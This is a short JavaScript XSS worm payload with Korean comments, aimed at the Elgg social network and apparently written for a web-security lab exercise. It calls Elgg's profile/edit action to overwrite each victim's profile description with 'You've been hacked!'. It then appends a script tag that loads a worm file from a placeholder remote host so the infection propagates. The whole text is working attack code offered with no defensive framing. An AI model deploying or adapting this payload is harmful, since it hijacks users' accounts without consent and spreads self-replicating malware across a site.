// 피해자의 프로필을 수정하는 코드
var desc = encodeURIComponent("You've been hacked!"); // 감염된 프로필에 입력될 내용
var content = {
    description: desc
};

elgg.action('profile/edit', {
    data: content,
    success: function(response) {
        // 프로필 수정이 성공했을 때 실행되는 코드
        console.log('Profile updated successfully');
    },
    error: function(response) {
        // 프로필 수정이 실패했을 때 실행되는 코드
        console.error('Failed to update profile');
    }
});

// 웜을 다른 프로필에 복사하여 전파하는 코드
var wormScript = document.createElement('script');
wormScript.src = 'http://www.example.com/xss_worm.js'; // 웜 스크립트의 URL을 여기에 입력
document.body.appendChild(wormScript);
